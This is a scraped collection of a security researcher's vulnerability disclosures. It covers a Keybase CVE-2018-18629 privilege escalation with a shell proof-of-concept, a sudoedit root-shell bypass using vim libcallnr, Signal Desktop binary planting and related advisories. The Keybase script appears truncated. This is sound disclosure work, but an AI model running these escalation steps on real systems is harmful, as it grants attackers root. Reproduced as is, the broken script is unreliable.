=== Content from raw.githubusercontent.com_5883466e_20250126_123158.html ===
#!/bin/sh
# PoC for CVE-2018-18629 Keybase Linux Privilege Escalation
# Rich Mirch
# build fusermount trojan
# copy python to cwd and make it setuid
# Note: arbitrary commands can be added to this script
cat >fusermount</dev/tty
EOF
chmod 750 fusermount
env PATH=$PWD:$PATH keybase-redirector /keybase 2>&1 &
sleep 1 # one second should be enough time for fusermount call
./woot -c 'import os;os.setuid(0);os.system("/bin/bash")'
rm -f woot fusermount


=== Content from blog.mirch.io_ec6df4ca_20250126_123159.html ===

[Skip to content](#content)

* [Home](/)
* [Vulnerability Research](https://blog.mirch.io/cve/)
* [Github](https://github.com/mirchr/security-research)
* [Twitter](https://twitter.com/0xm1rch)
* [About](https://blog.mirch.io/about/)

Search for:

[Rich Mirch](https://blog.mirch.io "Rich Mirch")
# [Rich Mirch](https://blog.mirch.io/ "Rich Mirch")

## Penetration Tester, Red Teamer, Security Researcher

Menu

[CVE-2018-18629: Keybase Linux privilege escalation — December 21, 2018](https://blog.mirch.io/2018/12/21/cve-2018-18629-keybase-linux-privilege-escalation/ "CVE-2018-18629: Keybase Linux privilege escalation")

[![](https://blog.mirch.io/wp-content/uploads/2018/12/keybase-woot.png?w=712)](https://blog.mirch.io/2018/12/21/cve-2018-18629-keybase-linux-privilege-escalation/ "CVE-2018-18629: Keybase Linux privilege escalation")

## [CVE-2018-18629: Keybase Linux privilege escalation](https://blog.mirch.io/2018/12/21/cve-2018-18629-keybase-linux-privilege-escalation/)

[December 21, 2018May 3, 2019](https://blog.mirch.io/2018/12/21/cve-2018-18629-keybase-linux-privilege-escalation/ "12:43 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

Recently I started using [Keybase](https://keybase.io/) which is a Slack like application but provides end-to-end encryption. Version 2.8.0.20181017144746.3efc4cbf3c is vulnerable to a privilege escalation vulnerability allowing a low privileged user to execute arbitrary commands as root.

After executing the application using a low privileged account I noticed a process named keybase-redirector running as root. I was interested and wanted to understand how this worked. After checking the file permissions I found that the keybase-redirector was setuid root. I enjoy the challenge of finding vulnerabilities in privileged binaries so I started my research.

One of the first techniques I use when attacking setuid binaries is to test for PATH injections. The PATH environment variable is a colon separated list of directories that is searched when executing a command by name. As a test I reset the PATH environment variable to a unique value while executing keybase-redirector.  Using the env command  inline ensures that the PATH is only set for the execution and the current value of PATH is unmodified.

> [user1@localhost ~]$ env PATH=/foobar /usr/bin/keybase-redirector /keybase
>
> Mount error, exiting cleanly: fusermount: exec: “fusermount”: executable file not found in $PATH

The descriptive error message immediately caught my attention. To confirm the potential vulnerability I executed the [strace(1)](http://man7.org/linux/man-pages/man1/strace.1.html) utility. strace traces system calls and has a variety of options. The common options that I use are -f(follow forks), -s (maximum string size to print) and -u [username]. strace generates verbose output so this is where the unique PATH string becomes useful. We can quickly search the output for that string to find potential injection points. When tracing a setuid binary, strace must be executed from root because privileges are dropped. In some cases the error message may not provide any clues. Regardless of the output I always run strace to verify. As you can see in the below output, the newfstatat() call is checking if /foobar/fusermount exists.

> [root@localhost ~]# env PATH=/foobar /usr/bin/strace -u user1 -f /usr/bin/keybase-redirector /keybase 2>&1|grep foobar
>
> [pid 4890] newfstatat(AT\_FDCWD, “**/foobar/fusermount**“, 0xc420070858, 0) = -1 ENOENT (No such file or directory)

Now that it appears the program trusts the value of PATH we can try to exploit it. I crafted a fusermount binary to create the /w00t file. View the original PoC in the Hackerone report [426944](https://hackerone.com/reports/426944). Since then I created a new PoC to get an interactive root shell. Updated PoC can be found at my Github repo [CVE-2018-18629.sh](https://raw.githubusercontent.com/mirchr/security-research/master/vulnerabilities/CVE-2018-18629.sh)

PoC screenshot for CentOS 7.4.1708.

![keybase-woot](https://blog.mirch.io/wp-content/uploads/2018/12/keybase-woot.png?w=712)

## Summary

Setuid programs should reset the PATH environment variable prior to executing any external binaries. Fully qualified paths can also be used. The response from Keybase was amazing and I really enjoyed the partnership. [@maxtaco](https://twitter.com/maxtaco) committed the fix to the master branch within one hour of receiving the report! I appreciate their transparency and technical write-up in the advisory.

References

* Keybase advisory: [Local Privilege Escalation on Linux via keybase-redirector (KB002)](https://keybase.io/docs/secadv/kb002).
* Hackerone Report: [Linux privilege escalation via trusted $PATH in keybase-redirector](https://hackerone.com/reports/426944).
* BleepingComputer article: [Keybase Pays $5,000 Bounties for Privilege Escalation Bugs in Linux and macOS Apps](https://www.bleepingcomputer.com/news/security/keybase-pays-5-000-bounties-for-privilege-escalation-bugs-in-linux-and-macos-apps/).

### Share this:

* [Twitter](https://blog.mirch.io/2018/12/21/cve-2018-18629-keybase-linux-privilege-escalation/?share=twitter "Click to share on Twitter")
* [Facebook](https://blog.mirch.io/2018/12/21/cve-2018-18629-keybase-linux-privilege-escalation/?share=facebook "Click to share on Facebook")
Like Loading...
### *Related*

Categories: [Linux](https://blog.mirch.io/category/linux/)Tags: [exploit](https://blog.mirch.io/tag/exploit/), [Linux](https://blog.mirch.io/tag/linux/)

## Post navigation

[CVE-2018-19788 PoC – polkit: Improper handling of user with uid > INT\_MAX leading to authentication bypass](https://blog.mirch.io/2018/12/09/cve-2018-19788-poc-polkit-improper-handling-of-user-with-uid-int_max-leading-to-authentication-bypass/)[Linux persistence idea – using group passwords](https://blog.mirch.io/2019/01/09/linux-persistence-idea-using-group-passwords/)

### Tags

[exploit](https://blog.mirch.io/tag/exploit/)
[hacking sudo](https://blog.mirch.io/tag/hacking-sudo/)
[Linux](https://blog.mirch.io/tag/linux/)
[PostgreSQL](https://blog.mirch.io/tag/postgresql/)
[sudo hacking](https://blog.mirch.io/tag/sudo-hacking/)
[vulnerability](https://blog.mirch.io/tag/vulnerability/)
[Follow Rich Mirch on WordPress.com](https://blog.mirch.io)

* [GitHub](https://github.com/mirchr)
* [LinkedIn](https://www.linkedin.com/in/mirchr/)

[Create a website or blog at WordPress.com](https://wordpress.com/?ref=footer_custom_svg "Create a website or blog at WordPress.com")

* Reblog
* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2018%252F12%252F21%252Fcve-2018-18629-keybase-linux-privilege-escalation%252F)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2018%252F12%252F21%252Fcve-2018-18629-keybase-linux-privilege-escalation%252F)
  + [Copy shortlink](https://wp.me/paoR5j-2Y)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://blog.mirch.io/2018/12/21/cve-2018-18629-keybase-linux-privilege-escalation/)
  + [View post in Reader](https://wordpress.com/read/blogs/153687293/posts/184)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

%d

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from github.com_91affc1f_20250126_123200.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fkeybase%2Fclient%2Ftree%2Fmaster%2Fgo%2Fkbfs%2Fredirector)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fkeybase%2Fclient%2Ftree%2Fmaster%2Fgo%2Fkbfs%2Fredirector)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Ffiles%2Fdisambiguate&source=header-repo&source_repo=keybase%2Fclient)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[keybase](/keybase)
/
**[client](/keybase/client)**
Public

* [Notifications](/login?return_to=%2Fkeybase%2Fclient) You must be signed in to change notification settings
* [Fork
  1.2k](/login?return_to=%2Fkeybase%2Fclient)
* [Star
   8.9k](/login?return_to=%2Fkeybase%2Fclient)

* [Code](/keybase/client)
* [Issues
  4k](/keybase/client/issues)
* [Pull requests
  186](/keybase/client/pulls)
* [Actions](/keybase/client/actions)
* [Projects
  0](/keybase/client/projects)
* [Security](/keybase/client/security)
* [Insights](/keybase/client/pulse)

Additional navigation options

* [Code](/keybase/client)
* [Issues](/keybase/client/issues)
* [Pull requests](/keybase/client/pulls)
* [Actions](/keybase/client/actions)
* [Projects](/keybase/client/projects)
* [Security](/keybase/client/security)
* [Insights](/keybase/client/pulse)

## Files

 master
## Breadcrumbs

1. [client](/keybase/client/tree/master)
2. /[go](/keybase/client/tree/master/go)
3. /[kbfs](/keybase/client/tree/master/go/kbfs)
/
# redirector

/Copy path
## Directory actions

## More options

## Directory actions

## More options

## Latest commit

## History

[History](/keybase/client/commits/master/go/kbfs/redirector) master
## Breadcrumbs

1. [client](/keybase/client/tree/master)
2. /[go](/keybase/client/tree/master/go)
3. /[kbfs](/keybase/client/tree/master/go/kbfs)
/
# redirector

/Top
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| parent directory[..](/keybase/client/tree/master/go/kbfs) | | |
| [disable\_dumpable.go](/keybase/client/blob/master/go/kbfs/redirector/disable_dumpable.go "disable_dumpable.go") | | [disable\_dumpable.go](/keybase/client/blob/master/go/kbfs/redirector/disable_dumpable.go "disable_dumpable.go") |  |  |
| [disable\_dumpable\_linux.go](/keybase/client/blob/master/go/kbfs/redirector/disable_dumpable_linux.go "disable_dumpable_linux.go") | | [disable\_dumpable\_linux.go](/keybase/client/blob/master/go/kbfs/redirector/disable_dumpable_linux.go "disable_dumpable_linux.go") |  |  |
| [main.go](/keybase/client/blob/master/go/kbfs/redirector/main.go "main.go") | | [main.go](/keybase/client/blob/master/go/kbfs/redirector/main.go "main.go") |  |  |
| View all files | | |

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from blog.mirch.io_13739932_20250126_123157.html ===

[Skip to content](#content)

* [Home](/)
* [Vulnerability Research](https://blog.mirch.io/cve/)
* [Github](https://github.com/mirchr/security-research)
* [Twitter](https://twitter.com/0xm1rch)
* [About](https://blog.mirch.io/about/)

Search for:

[Rich Mirch](https://blog.mirch.io "Rich Mirch")
# [Rich Mirch](https://blog.mirch.io/ "Rich Mirch")

## Penetration Tester, Red Teamer, Security Researcher

Menu

[Exploiting Kaseya Unitrends Backup Appliance – Part 1 — May 20, 2022](https://blog.mirch.io/2022/05/20/exploiting-kaseya-unitrends-backup-appliance-part-1/ "Exploiting Kaseya Unitrends Backup Appliance – Part 1")

## [Exploiting Kaseya Unitrends Backup Appliance – Part 1](https://blog.mirch.io/2022/05/20/exploiting-kaseya-unitrends-backup-appliance-part-1/)

[May 20, 2022May 20, 2022](https://blog.mirch.io/2022/05/20/exploiting-kaseya-unitrends-backup-appliance-part-1/ "9:50 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

![](https://blog.mirch.io/wp-content/uploads/2022/05/unitrends-woot.png?w=889)

In 2021 I discovered several high and critical vulnerabilities in the [Kaseya Unitrends](https://www.unitrends.com/products/unitrends-backup-appliances) backup appliance. This research was conducted and published as part of my day job. Part one details a chain of vulnerabilities by leveraging an insecure [PostgreSQL](https://www.postgresql.org/) database to ultimately gain shell access to the remote server. Visit <https://www.cyberonesecurity.com/blog/exploiting-kaseya-unitrends-backup-appliance-part-1> for the the full write-up. Stay tuned for part two.

[sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability — January 25, 2021](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability")

[![](https://blog.mirch.io/wp-content/uploads/2021/01/image-10.png?w=712)](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability")

## [sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability](https://blog.mirch.io/2021/01/25/sudoedit-lpe/)

[January 25, 2021January 25, 2021](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "8:43 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

I noticed the following changelog entry in sudo [1.9.5p1.](https://www.sudo.ws/stable.html#1.9.5p1) This caught my attention so I decided to look further. I was unable to find an advisory, PoC, or CVE for this vulnerability. Using the details from the changelog message and fix, I decided to write an exploit for it.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image.png?w=1024)

Using an Ubuntu 20.04.1 VM, I created a low privileged user named “lowpriv” and added a sudoedit rule for a root owned file /etc/test.txt. I also downloaded the [source](https://github.com/sudo-project/sudo/archive/SUDO_1_9_5.tar.gz) for sudo 1.9.5, compiled it, and installed it to /opt/sudo.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-3.png?w=1024)

Show sudoedit rule.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-1.png?w=1024)

Show the sudo version is 1.9.5.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-2.png?w=1024)

With the test environment ready I ran sudoedit /etc/test.txt. I executed !id as a quick test which executes the id command in a shell however privileges are dropped by bash when the UID != EUID. Back to the drawing board.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-5.png?w=1024)

I was able to successfully edit arbitrary files simply using the :e /etc/sudoers or :e /etc/shadow commands to escalate privileges, however that was too easy.

Looking for esoteric features that could potentially be leveraged, I discovered the libcall and libcallnr functions which allow you to execute a function from an external library. The one caveat is there can only be a single argument. There are a crazy amount of functions available to vim that I never realized. Check out <https://vim.help/41-write-a-vim-script#41.6> for the full listing.

I tried calling a variety of functions with varying degrees of success but found a simple method by calling [setuid()](https://man7.org/linux/man-pages/man2/setuid.2.html) directly.

`call libcallnr("libc.so.6","setuid",0)`

After running sudoedit, use the following vim/ex command to change the UID to zero. This will ensure that shelling out will retain privileges because now UID==EUID.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-8.png?w=1024)

Execute a bash shell with !bash.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-9.png?w=198)

Interactive root shell obtained. Woot!

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-10.png?w=1024)

I tested the same proof of concept with 1.9.5p1 and sudoedit properly drops privileges as expected.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-11.png?w=1024)

**Summary**

If you upgraded to sudo 1.9.5 to fix [CVE-2021-23240](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23240) or [CVE-2021-23239](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23239), a new privilege escalation vulnerability was introduced in sudoedit and you should upgrade to 1.9.5p1.

Once in a while I look at recently fixed vulnerabilities to see if I can bypass the fix. In this case, the sudo project knew about this vulnerably but to my knowledge no advisory or CVE was created. I think this is odd that the issue was not communicated since a valid privilege escalation was patched. It’s unclear if another researcher reported it or if maintainers discovered it during their own testing. I also could not find a proof of concept so I decided to write one as a fun exercise.

I hope you enjoyed the short write up. Hit me me up on Twitter [@0xm1rch](https://twitter.com/0xm1rch) if you have any questions or comments.

[Pi-hole Patches Critical Stored XSS Vulnerability — December 24, 2020](https://blog.mirch.io/2020/12/24/pihole-xss/ "Pi-hole Patches Critical Stored XSS Vulnerability")

[![](https://blog.mirch.io/wp-content/uploads/2020/12/piholexss.png?w=641)](https://blog.mirch.io/2020/12/24/pihole-xss/ "Pi-hole Patches Critical Stored XSS Vulnerability")

## [Pi-hole Patches Critical Stored XSS Vulnerability](https://blog.mirch.io/2020/12/24/pihole-xss/)

[December 24, 2020December 24, 2020](https://blog.mirch.io/2020/12/24/pihole-xss/ "10:03 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

Pi-hole v5.2.1 is vulnerable to a critical stored cross site scripting vulnerability. An attacker with the ability to directly or indirectly query DNS with a malicious hostname can cause arbitrary JavaScript to execute when the Pi-hole administrator accesses the Query Log or Long-term Query Log pages on the web portal.

The Pi-hole project released a fix on 12/24/2020 in v5.2.2. Shodan reports over 7,500 Pi-hole instances. This could be remotely exploited if these instances permit external DNS queries. Other possibilities may exist if a malformed DNS query is allowed.

No payloads are being published at this time to give users time to patch.

**References**

* <https://github.com/pi-hole/AdminLTE/pull/1665>

**Timeline**

* 12/16/2020 Vulnerability reported to vendor
* 12/18/2020 Vendor acknowledged receipt of report
* 12/22/2020 Discovered a second XSS payload that would fire on the Long-term Queries Page
* 12/23/2020 Mitre assigns CVE-2020-35659
* 12/24/2020 Vendor released fix in v5.2.2

[Metasploit module developed for CVE-2018-18556 VyOS Privilege Escalation — September 25, 2020](https://blog.mirch.io/2020/09/25/metasploit-module-developed-for-cve-2018-18556-vyos-privilege-escalation/ "Metasploit module developed for CVE-2018-18556 VyOS Privilege Escalation")

## [Metasploit module developed for CVE-2018-18556 VyOS Privilege Escalation](https://blog.mirch.io/2020/09/25/metasploit-module-developed-for-cve-2018-18556-vyos-privilege-escalation/)

[September 25, 2020September 25, 2020](https://blog.mirch.io/2020/09/25/metasploit-module-developed-for-cve-2018-18556-vyos-privilege-escalation/ "3:52 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

Today, a Metasploit module was merged for a vulnerability I found in 2018 with [VyOS](https://www.vyos.io/). This vulnerability was my first public InfoSec blog post. I appreciate [bcoles](https://github.com/bcoles) for developing the [exploit/linux/ssh/vyos\_restricted\_shell\_privesc](https://github.com/rapid7/metasploit-framework/pull/14123) module. Read the [Metasploit Wrapup for 9/25/2020](https://blog.rapid7.com/2020/09/25/metasploit-wrap-up-80/). The full write-up can can be found on this blog at [C](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/)[VE-2018-18556 – VyOS Privilege escalation via sudo pppd for operator users](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/).

[Critical Vulnerabilities Discovered in MoFi Routers — September 2, 2020](https://blog.mirch.io/2020/09/02/critical-vulnerabilities-discovered-in-mofi-routers/ "Critical Vulnerabilities Discovered in MoFi Routers")

## [Critical Vulnerabilities Discovered in MoFi Routers](https://blog.mirch.io/2020/09/02/critical-vulnerabilities-discovered-in-mofi-routers/)

[September 2, 2020](https://blog.mirch.io/2020/09/02/critical-vulnerabilities-discovered-in-mofi-routers/ "1:08 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

I discovered several vulnerabilities in the MoFi4500 LTE router. Several vulnerabilities have not been patched, including an unauthenticated remote command injection and several undocumented backdoors. The full write-up can be viewed at <https://www.criticalstart.com/critical-vulnerabilities-discovered-in-mofi-routers/>.

Media Coverage

* <https://www.cyberscoop.com/mofi-networks-routers-zero-day-critical-start/>
* <https://www.zdnet.com/article/backdoors-left-unpatched-in-mofi-routers/>

Follow the conversation on Twitter

> The team is at it again! This time with 10 [#0days](https://twitter.com/hashtag/0days?src=hash&ref_src=twsrc%5Etfw) found by [@0xm1rch](https://twitter.com/0xm1rch?ref_src=twsrc%5Etfw) for routers from [@MoFiNetwork](https://twitter.com/MoFiNetwork?ref_src=twsrc%5Etfw). After coordinating with others to reduce impact there still appears to be over 6,860 vulnerable devices externally facing.[#Infosec](https://twitter.com/hashtag/Infosec?src=hash&ref_src=twsrc%5Etfw) [#redteam](https://twitter.com/hashtag/redteam?src=hash&ref_src=twsrc%5Etfw)<https://t.co/1A1UgRmJrq> [pic.twitter.com/YKPiF4LFMq](https://t.co/YKPiF4LFMq)
>
> — TeamARES (@TeamAresSec) [September 2, 2020](https://twitter.com/TeamAresSec/status/1301200248417775618?ref_src=twsrc%5Etfw)

[CVE-2020-3950 VMware Fusion Elevation of Privilege — March 17, 2020](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/ "CVE-2020-3950 VMware Fusion Elevation of Privilege")

[![](https://blog.mirch.io/wp-content/uploads/2020/03/vmware-fusion-cve-2020-3950-cropped.png?w=712)](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/ "CVE-2020-3950 VMware Fusion Elevation of Privilege")

## [CVE-2020-3950 VMware Fusion Elevation of Privilege](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/)

[March 17, 2020April 3, 2020](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/ "10:55 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

VMware Fusion 11.5.~~1~~2 and prior are vulnerable to an elevation of privilege vulnerability. For more details please review the advisory and proof of concept on my Github page [CVE-2020-3950.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2020-3950.sh). VMware released a the patch last week and a public advisory [VMSA-2020-0005](https://www.vmware.com/security/advisories/VMSA-2020-0005.html) today however it has been determined that the patch does not properly fix the vulnerability. I reached out to the VMware security team and received a response at 10:31 UTC 2020-03-18 – “We are aware of the situation and working on the next steps”.

I also learned today that [Jeff Ball](https://twitter.com/jeffball55) at [GRIMM](https://twitter.com/grimmcyber) also independently discovered and reported the vulnerability to VMware.  This is a first for me. Make sure to read their excellent detailed write-up <https://blog.grimm-co.com/post/analyzing-suid-binaries/>. You can also follow the thread on Twitter.

> PoC for CVE-2020-3950 VMware Fusion EoP. <https://t.co/F0jGnE9BZu> Vendor Advisory: <https://t.co/28f3aoAFsG> [pic.twitter.com/5WYG9xg5cv](https://t.co/5WYG9xg5cv)
>
> — Rich Mirch (@0xm1rch) [March 17, 2020](https://twitter.com/0xm1rch/status/1240030085450731521?ref_src=twsrc%5Etfw)

### **Related Articles**

* BleepingComputer [VMware Fixes High Severity Privilege Escalation Bug in Fusion](https://www.bleepingcomputer.com/news/security/vmware-fixes-high-severity-privilege-escalation-bug-in-fusion/)
* ZDNet [VMware patches privilege escalation vulnerability in Fusion, Horizon](https://www.zdnet.com/article/vmware-patches-privilege-escalation-vulnerability-in-workstation-fusion-horizon/)
* SecurityWeek [VMware Fixes Privilege Escalation Vulnerability in Fusion for Mac](https://www.securityweek.com/vmware-fixes-privilege-escalation-vulnerability-fusion-mac)
* SecurityWeek [Patch for Recently Disclosed VMware Fusion Vulnerability Incomplete](https://www.securityweek.com/recent-patch-vmware-fusion-vulnerability-incomplete)
* SecurityWeek [VMware Again Fails to Patch Privilege Escalation Vulnerability in Fusion](https://www.securityweek.com/vmware-again-fails-patch-privilege-escalation-vulnerability-fusion)
* Metasploit Module [Blown up by your own Fusion bomb](https://blog.rapid7.com/2020/04/03/metasploit-wrap-up-58/)

[CVE-2019-19954 Signal Desktop Windows Elevation of Privilege Vulnerability — December 18, 2019](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/ "CVE-2019-19954 Signal Desktop Windows Elevation of Privilege Vulnerability")

## [CVE-2019-19954 Signal Desktop Windows Elevation of Privilege Vulnerability](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/)

[December 18, 2019August 6, 2020](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/ "7:25 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

# Vulnerability Summary

Signal Desktop v1.29 on Windows is vulnerable to an elevation of privilege vulnerability. During the startup the application will execute the c:\node\_modules\.bin\wmic.exe binary if it exists. By default on Windows, low privileged users have the privilege to create folders under root level drives. A low privileged user can create a malicious wmic.exe which will be executed every time Signal Desktop starts by any user of the system. The malicious binary is executed in the background without the users knowledge. This is an example of horizontal [privilege escalation](https://en.wikipedia.org/wiki/Privilege_escalation).

The vulnerability has been patched in v1.29.1 in commit [2da39c](https://github.com/signalapp/Signal-Desktop/commit/2da39cca673cc11be3c6d70d4fb95889f9ab6688) which was released 12/17/2019. Kudos to the Signal security team for fixing in less than two weeks! Unfortunately, at this time the they do not feel this warrants an advisory or CVE so the vulnerability was silently fixed. **12/24/2019 Update:** Mitre assigned CVE-2019-19954

## Steps To Reproduce

In a cmd window

```
mkdir c:\node_modules\.bin
copy c:\windows\system32\calc.exe c:\node_modules\.bin\wmic.exe

```

Now any user that opens Signal, the Windows calculator will be popped.

## PoC

![signal-lpe-3](https://blog.mirch.io/wp-content/uploads/2020/08/signal-lpe-3.png)

## Timeline

* 2019-12-05: Report sent to Signal security team
* 2019-12-11: Reached out to Signal to verify report was received
* 2019-12-16: Signal acknowledges report
* 2019-12-17: Signal v1.29.1 released
* 2019-12-18: Published this blog post
* 2019-12-24: MITRE assigned CVE-2019-19954

## References

* Commit: [2da39c](https://github.com/signalapp/Signal-Desktop/commit/2da39cca673cc11be3c6d70d4fb95889f9ab6688)
* Vulnerable version: <https://updates.signal.org/desktop/signal-desktop-win-1.29.0.exe>

[CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg\_ctlcluster — November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg_ctlcluster")

[![](https://blog.mirch.io/wp-content/uploads/2019/11/debian-buster-postgres-root.png?w=712)](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg_ctlcluster")

## [CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg\_ctlcluster](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/)

[November 15, 2019November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "6:54 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

# Vulnerability Summary

The [pg\_ctlcluster](https://manpages.debian.org/buster/postgresql-common/pg_ctlcluster.1.en.html) script in the postgresql-common package in Debian and Ubuntu is vulnerable to a local privilege escalation attack. pg\_ctlcluster is a script used to manage PostgreSQL instances. A malicious actor with access to the postgres account can create arbitrary directories during startup or reload when called via systemd. This vulnerability can be leveraged to escalate privileges to root.

